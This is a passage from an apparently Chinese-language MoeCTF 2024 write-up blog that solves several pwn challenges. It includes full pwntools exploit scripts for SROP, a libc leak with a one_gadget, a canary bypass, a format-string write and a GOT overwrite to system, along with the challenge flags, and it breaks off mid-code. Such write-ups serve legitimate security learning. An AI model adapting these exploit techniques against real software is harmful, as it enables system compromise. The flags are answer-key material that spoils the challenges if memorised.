class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> wstube <span class="keyword">import</span> websocket</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">p = websocket(<span class="string">"wss://ctf.xidian.edu.cn/api/traffic/9kVIEvUd1GcUiY1Yzbwil?port=9999"</span>)</span><br><span class="line"><span class="comment"># p = process("./alarm")</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#   int v2; // [rsp+0h] [rbp-50h]</span></span><br><span class="line"><span class="comment">#   char v3[62]; // [rsp+4h] [rbp-4Ch] BYREF</span></span><br><span class="line"><span class="comment">#   _WORD v4[7]; // [rsp+42h] [rbp-Eh] BYREF</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#   *(_QWORD *)&amp;v4[3] = __readfsqword(0x28u);</span></span><br><span class="line"></span><br><span class="line">v3_pos = -<span class="number">0x4c</span></span><br><span class="line">s2_pos = -<span class="number">0x30</span></span><br><span class="line">v2_pos = -<span class="number">0x20</span></span><br><span class="line">v1_pos = -<span class="number">0x18</span></span><br><span class="line"></span><br><span class="line">num_standard = <span class="number">0x1869e</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">    load_ = p.recvline()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b"[Error]"</span> <span class="keyword">not</span> <span class="keyword">in</span> load_:</span><br><span class="line">        origin_load = load_</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">     </span><br><span class="line">voice_pass = origin_load[s2_pos - v3_pos : s2_pos - v3_pos + <span class="number">0xf</span>] + <span class="string">b"\x00"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b"[Info] Speak out the voice password.\n"</span>, voice_pass + <span class="string">b"\x9e\x86\x01\x00\x00\x00\x00"</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b"[Info] Input the numeric password.\n"</span>, <span class="built_in">str</span>(num_standard))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>flag: <code>moectf{D0n't_FORgeT-TO_53t-p@5swORd-@gA1N2fdcc0}</code></p>
+<h3 id="return-15">18 Return 15</h3>
+<p>IDA查看，main函数有一个溢出点</p>
+<p><img src="/2024/09/28/MOECTF/image-20240928100719678.png"></p>
+<p>还有两个函数：</p>
+<p><img src="/2024/09/28/MOECTF/image-20240928100809458.png"></p>
+<p>系统调用号<code>0xf</code>，<code>syscall | ret</code>gadget，常规srop + ret2syscall。</p>
+<p>同时发现程序有给字符串<code>/bin/sh</code></p>
+<p><img src="/2024/09/28/MOECTF/image-20240928101021218.png"></p>
+<p>通过srop调整寄存器，用syscall来触发系统中断，<code>getshell</code></p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> wstube <span class="keyword">import</span> websocket</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">p = websocket(<span class="string">"wss://ctf.xidian.edu.cn/api/traffic/huqBAUUdo4KMyUVDP6SxV?port=9999"</span>)</span><br><span class="line"><span class="comment"># p = process("./pwn")</span></span><br><span class="line">rax_set = <span class="number">0x000000000040110A</span></span><br><span class="line">syscall_ret = <span class="number">0x000000000040111C</span></span><br><span class="line">sh_address = <span class="number">0x402008</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">59</span></span><br><span class="line">frame.rdi = sh_address</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = syscall_ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b""</span></span><br><span class="line">payload += <span class="string">b"A"</span> * (<span class="number">32</span> + <span class="number">8</span>)</span><br><span class="line">payload += p64(rax_set)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line">payload += <span class="built_in">bytes</span>(frame)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>flag: <code>moectf{Y0U-C@ughT_Th3_lS-and-5ROp!e39512b6}</code></p>
+<h3 id="visibleinput">19 VisibleInput</h3>
+<p>可视化shellcode + 沙箱。</p>
+<p>找时间想自己写一写，现在不会。</p>
+<h3 id="system_not_found">20 System_not_Found</h3>
+<p>很有意思的一个题。</p>
+<p><img src="/2024/09/28/MOECTF/image-20240928101758436.png"></p>
+<p>main函数里面有两个漏洞点，可以通过buf溢出去覆盖nbytes，来达到溢出v6的目的。</p>
+<p>但是他会在输入之后手动在字符串后面加上<code>\x00</code>，也就是没办法通过puts函数泄露栈上数据。</p>
+<p>程序没有开PIE，在gadget里面并没有找到<code>pop rdi</code>。</p>
+<p>但是很有意思的一个点，通过动态调试可以发现，在main函数结束完最后一个printf返回的时候，rdi在printf函数里被设置成了一个指针，指向一个名为<code>funlockfile</code>的libc函数。</p>
+<p><img src="/2024/09/28/MOECTF/image-20240928102226759.png"></p>
+<p>通过libc的解析可以发现这个函数原名为<code>_IO_funlockfile</code>，我们可以直接通过这个指针去泄露<code>_IO_funlockfile</code>的地址，从而达到泄露<code>libc</code>基址的目的。</p>
+<p>之后再返回来<code>vuln</code>函数实现一次华丽的<code>getshell</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> wstube <span class="keyword">import</span> websocket</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">p = websocket(<span class="string">"wss://ctf.xidian.edu.cn/api/traffic/N5ZNagpcEpj7S0O9FYdPW?port=9999"</span>)</span><br><span class="line"><span class="comment"># p = process("./dialogue", env = {"LD_PRELOAD" : "./libc.so.6"})</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./dialogue"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload = <span class="string">b"A"</span> * <span class="number">16</span> + <span class="string">b"\x7f"</span> + <span class="string">b"1"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">pause()</span><br><span class="line">payload = <span class="string">b"A"</span> * (<span class="number">0x28</span> + <span class="number">8</span>)</span><br><span class="line">payload += p64(elf.plt[<span class="string">"puts"</span>])</span><br><span class="line">payload += p64(elf.sym[<span class="string">"main"</span>])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b"Where do you come from?\n&gt; "</span>, payload)</span><br><span class="line">p.recvline()</span><br><span class="line">funlockfile = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b"\x00"</span>))</span><br><span class="line">libc_base = funlockfile - libc.sym[<span class="string">"_IO_funlockfile"</span>]</span><br><span class="line">one_gadget = [<span class="number">0x50a47</span>, <span class="number">0xebc81</span>, <span class="number">0xebc85</span>, <span class="number">0xebc88</span>]</span><br><span class="line"></span><br><span class="line">p.info(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload = <span class="string">b"A"</span> * <span class="number">16</span> + <span class="string">b"\x7f"</span> + <span class="string">b"1"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b"A"</span> * (<span class="number">0x28</span>)</span><br><span class="line">payload += p64(<span class="number">0x404040</span> + <span class="number">0x100</span>)</span><br><span class="line">payload += p64(one_gadget[<span class="number">1</span>] + libc_base)</span><br><span class="line">p.sendlineafter(<span class="string">b"Where do you come from?\n&gt; "</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>flag: <code>moectf{That's-4-b3@UTifuI_SHEIL78009f21}</code></p>
+<h3 id="read_once_twice">21 Read_once_twice!</h3>
+<p>IDA查看，有一个后门函数，有一个vuln函数，一个溢出点，但是开了<code>canary</code>。</p>
+<p><img src="/2024/09/28/MOECTF/image-20240928102936063.png"></p>
+<p>常规思路，第一次泄露canary，第二次跳到后门函数。但是观察到函数开了PIE，这里也只有8个字节的溢出，所以必须跳回<code>vuln</code>函数不能只输入两次。</p>
+<p><code>vuln</code>函数是被<code>main</code>程序调用的， 看<code>main</code>函数里面这两句代码的地址关系：</p>
+<p><img src="/2024/09/28/MOECTF/image-20240928103150567.png"></p>
+<p>返回地址<code>0x130c</code>, call vuln函数地址<code>0x1307</code>， 可以通过返回地址的单字节溢出，覆盖返回地址从<code>0c</code>到<code>07</code>，实现vuln函数的重调。</p>
+<p>重调之后第一次输入泄露返回地址，第二次输入直接跳到后门函数。</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> wstube <span class="keyword">import</span> websocket</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">p = websocket(<span class="string">"wss://ctf.xidian.edu.cn/api/traffic/3cwWspMwUN5FeCzyoae1d?port=9999"</span>)</span><br><span class="line"><span class="comment"># p = process("./twice")</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./twice"</span>)</span><br><span class="line"></span><br><span class="line">ret_addr_rel = <span class="number">0x000000000000130C</span></span><br><span class="line">call_vuln = <span class="number">0x0000000000001307</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b"a"</span> * <span class="number">25</span></span><br><span class="line">p.sendafter(<span class="string">b"What can you do when almost all protections are turned on?\n"</span>, payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(payload)</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>, <span class="string">b"\x00"</span>))</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">payload = <span class="string">b"A"</span> * <span class="number">24</span></span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += <span class="string">b"A"</span> * <span class="number">8</span></span><br><span class="line">payload += <span class="string">b"\x07"</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b"If I give you one more chance...\n"</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b"A"</span> * <span class="number">0x28</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b"What can you do when almost all protections are turned on?\n"</span>, payload)</span><br><span class="line">p.recvuntil(payload)</span><br><span class="line">ret_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b"\x00"</span>))</span><br><span class="line">target_addr = ret_addr - ret_addr_rel + <span class="number">0x11c6</span></span><br><span class="line">payload = <span class="string">b"A"</span> * <span class="number">24</span></span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += <span class="string">b"A"</span> * <span class="number">8</span></span><br><span class="line">payload += p64(target_addr)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b"If I give you one more chance...\n"</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>flag: <code>moectf{You-h4ve_Not_onLy-OnE_mORe_CH4ncE38f149}</code></p>
+<h3 id="where-is-fmt">22 Where is fmt?</h3>
+<p>简单的非栈上fmt<img src="/2024/09/28/MOECTF/image-20240929145456509.png"></p>
+<p>一个vuln函数里面给了三次fmt利用机会。考虑到buf是非栈上的，也就是要从栈里面找现成的数据。</p>
+<p>gdb调试一下，看栈里的数据，发现有一条链子可以利用。</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># <span class="number">00</span>:<span class="number">0000</span>│ <span class="built_in">rsp</span> <span class="number">0x7fffffffdc20</span> —▸ <span class="number">0x40129e</span> (main) ◂— endbr64</span><br><span class="line"># <span class="number">01</span>:<span class="number">0008</span>│-<span class="number">008</span> <span class="number">0x7fffffffdc28</span> ◂— <span class="number">0x3004011fa</span></span><br><span class="line"># <span class="number">02</span>:<span class="number">0010</span>│ <span class="built_in">rbp</span> <span class="number">0x7fffffffdc30</span> —▸ <span class="number">0x7fffffffdc40</span> ◂— <span class="number">1</span></span><br><span class="line"># <span class="number">03</span>:<span class="number">0018</span>│+<span class="number">008</span> <span class="number">0x7fffffffdc38</span> —▸ <span class="number">0x4012ba</span> (main+<span class="number">28</span>) ◂— <span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line"># <span class="number">09</span>:<span class="number">0048</span>│+<span class="number">038</span> <span class="number">0x7fffffffdc68</span> —▸ <span class="number">0x7fffffffdd58</span> —▸ <span class="number">0x7fffffffe007</span> ◂— <span class="string">'/home/wingee/Pwn&amp;Reverse/moe/22/pwn'</span></span><br><span class="line"></span><br><span class="line"># <span class="number">27</span>:<span class="number">0138</span>│ <span class="built_in">r12</span> <span class="number">0x7fffffffdd58</span> —▸ <span class="number">0x7fffffffe007</span> ◂— <span class="string">'/home/wingee/Pwn&amp;Reverse/moe/22/pwn'</span></span><br></pre></td></tr></table></figure>
+<p>就是这个<code>0xdd58</code>-&gt;<code>0xe007</code>-&gt;<code>....</code></p>
+<p>这两个指针都是位于栈上的，并且前一个指针指向后一个指针。我们可以通过fmt利用前一个指针去修改后一个的指针值，让他去指向我们想要去修改的数据的地址，进而完成任意地址写。</p>
+<p>所以本题的思路一共分三步：</p>
+<ul>
+<li>利用第一次的fmt泄露rbp指向的值，泄露栈地址。根据这个栈地址，算出指向vuln函数返回地址的栈指针。</li>
+<li>利用第二次的fmt，通过<code>0xdd58</code>的栈指针修改后一个指针指向vuln函数的返回地址。</li>
+<li>利用第三次的fmt，通过后一个指针，修改返回地址为<code>backdoor</code>函数地址。（注意栈对齐，实际上跳过压栈的语句）</li>
+</ul>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> wstube <span class="keyword">import</span> websocket</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">p = websocket(<span class="string">"wss://ctf.xidian.edu.cn/api/traffic/Dg9V4W1UdTMXEnoi1GSzN?port=9999"</span>)</span><br><span class="line"><span class="comment"># p = process("./pwn", env = {'LD_PRELOAD' : "./libc.so.6"})</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 00:0000│ rsp 0x7fffffffdc20 —▸ 0x40129e (main) ◂— endbr64</span></span><br><span class="line"><span class="comment"># 01:0008│-008 0x7fffffffdc28 ◂— 0x3004011fa</span></span><br><span class="line"><span class="comment"># 02:0010│ rbp 0x7fffffffdc30 —▸ 0x7fffffffdc40 ◂— 1</span></span><br><span class="line"><span class="comment"># 03:0018│+008 0x7fffffffdc38 —▸ 0x4012ba (main+28) ◂— mov eax, 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 09:0048│+038 0x7fffffffdc68 —▸ 0x7fffffffdd58 —▸ 0x7fffffffe007 ◂— '/home/wingee/Pwn&amp;Reverse/moe/22/pwn'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 27:0138│ r12 0x7fffffffdd58 —▸ 0x7fffffffe007 ◂— '/home/wingee/Pwn&amp;Reverse/moe/22/pwn'</span></span><br><span class="line"></span><br><span class="line">rbp_offset = <span class="number">8</span></span><br><span class="line">backdoor = <span class="number">0x401205</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"%{}$p"</span>.<span class="built_in">format</span>(rbp_offset)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b"\nYou have 3 chances.\n"</span>, payload)</span><br><span class="line">rbp_addr = <span class="built_in">eval</span>(p.recv(<span class="number">14</span>).decode()) - <span class="number">0x10</span></span><br><span class="line">target_addr = rbp_addr + <span class="number">8</span></span><br><span class="line">offset_2 = rbp_offset + (<span class="number">0x68</span> - <span class="number">0x30</span>) // <span class="number">8</span></span><br><span class="line">offset_3 = rbp_offset + (<span class="number">0xdd58</span> - <span class="number">0xdc30</span>) // <span class="number">8</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"%{}c%{}$hn"</span>.<span class="built_in">format</span>(target_addr % <span class="number">0x10000</span>, offset_2)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b"\nYou have 2 chances.\n"</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"%{}c%{}$hn"</span>.<span class="built_in">format</span>(backdoor % <span class="number">0x10000</span>, offset_3)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b"\nYou have 1 chances.\n"</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>flag: <code>moectf{c0NGr4TU1aT1ONs_You-f0Und-it5f97513}</code></p>
+<h3 id="got-it">23 Got it!</h3>
+<p>IDA查看，vuln函数支持一个对<code>saves</code>数组实现增改计算的功能。</p>
+<p><img src="/2024/09/28/MOECTF/image-20240928104128587.png"></p>
+<p>观察calc函数，发现没有对下标负数的检查，可以实现任意地址的读写。</p>
+<p><img src="/2024/09/28/MOECTF/image-20240928104218408.png"></p>
+<p>checksec查看程序， 发现是<code>partial Relro</code>，可以修改GOT表。</p>
+<p>那就是常规GOT表劫持，修改puts的GOT表为system，之后调用<code>show_saves</code>的时候就可以将save里的字符串当做命令传输给system。</p>
+<blockquote>
+<p>这个题钻了好久牛角尖，非要把puts的GOT表里面的地址泄露出来，没必要啊，只要将puts的GOT表里面的地址减去它在libc里面的system函数的偏移就能实现劫持。思维定式了属于是。</p>
+</blockquote>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> wstube <span class="keyword">import</span> websocket</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">p = websocket(<span class="string">"wss://ctf.xidian.edu.cn/api/traffic/IBdl5ngrvh0PoZnqHNpxH?port=9999"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process("./pwn", env = {"LD_PRELOAD" : "./libc.so.6"})</span></span><br><span class="line">elf = ELF(<span class="string">"./pwn"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line">saves_addr = <span class="number">0x4080</span></span><br><span class="line">offset_to_system = libc.sym[<span class="string">"system"</span>] - libc.sym[<span class="string">"puts"</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add = <span class="number">1</span></span><br><span class="line">sub = <span class="number">2</span></span><br><span class="line">mul = <span class="number">3</span></span><br><span class="line">div = <span class="number">4</span></span><br><span class="line">back = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>(<span class="params">offset, operator, operand</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b"1. Select an archive\n2. Show results\n3. Exit\n"</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b"Which archive do you want to use?\n"</span>, <span class="built_in">str</span>(offset))</span><br><span class="line">    p.sendlineafter(<span class="string">b"&gt; "</span>, <span class="built_in">str</span>(operator))</span><br><span class="line">    <span class="keyword">if</span> operator == back:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    p.sendlineafter(<span class="string">b"Operand: "</span>, <span class="built_in">str</span>(operand))</span><br><span class="line">    p.sendlineafter(<span class="string">b"&gt; "</span>, <span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_saves</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b"1. Select an archive\n2. Show results\n3. Exit\n"</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_saves</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b"1. Select an archive\n2. Show results\n3. Exit\n"</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    calc(i, add, u64(<span class="string">b"/bin/sh\x00"</span>))</span><br><span class="line"></span><br><span class="line">show_saves()</span><br><span class="line"></span><br><span class="line">offset_to_puts_got = <span class="built_in">int</span>((saves_addr - elf.got[<span class="string">"puts"</span>]) / <span class="number">8</span>)</span><br><span class="line">offset_to_now_save = <span class="number">16</span></span><br><span class="line">offset_be_now_puts_got = offset_to_puts_got * <span class="number">8</span> + <span class="number">16</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">calc(offset_to_now_save, sub, offset_be_now_puts_got)</span><br><span class="line">p.sendlineafter(<span class="string">b"1. Select an archive\n2. Show results\n3. Exit\n"</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">b"Which archive do you want to use?\n"</span>, <span class="built_in">str</span>(offset_to_now_save))</span><br><span class="line">p.sendlineafter(<span class="string">b"&gt; "</span>, <span class="built_in">str</span>(sub))</span><br><span class="line">p.sendlineafter(<span class="string">b"Operand: "</span>, <span class="built_in">str</span>(offset_be_now_puts_got))</span><br><span class="line">p.sendlineafter(<span class="string">b"&gt; "</span>, <span class="built_in">str</span>(add))</span><br><span class="line">p.sendlineafter(<span class="string">b"Operand: "</span>, <span class="built_in">str</span>(offset_to_system))</span><br><span class="line">p.sendlineafter(<span class="string">b"&gt; "</span>, <span class="built_in">str</span>(back))</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    </span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>flag: <code>moectf{yOU_KNoW-what-i5_p4RtI@L-R3LRo9dd80b}</code></p>
+<h3 id="栈的奇妙之旅">24 栈的奇妙之旅</h3>
+<p>IDA查看程序，只给了16个字节的溢出，栈地址不知道，什么都不知道，程序没开PIE，可以溢出之后再跳回来。但是感觉没意义。</p>
+<p><img src="/2024/09/28/MOECTF/image-20240928105113719.png"></p>
+<p>还给了一个<code>pop rdi| ret</code>的gadget</p>
+<p><img src="/2024/09/28/MOECTF/image-20240928105059505.png"></p>
+<p>常规思路是栈迁移，可以迁到<code>.data</code>段或者<code>.bss</code>段。但我们需要重新在上面布栈，因为之前这些地方是空的。</p>
+<p>下面这段代码可以好好利用一下。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># .text:00000000004011E5                 lea     rax, [rbp+buf]</span></span><br><span class="line"><span class="comment"># .text:00000000004011E9                 mov     edx, 90h        ; nbytes</span></span><br><span class="line"><span class="comment"># .text:00000000004011EE                 mov     rsi, rax        ; buf</span></span><br><span class="line"><span class="comment"># .text:00000000004011F1                 mov     edi, 0          ; fd</span></span><br><span class="line"><span class="comment"># .text:00000000004011F6                 call    _read</span></span><br><span class="line"><span class="comment"># .text:00000000004011FB                 nop</span></span><br><span class="line"><span class="comment"># 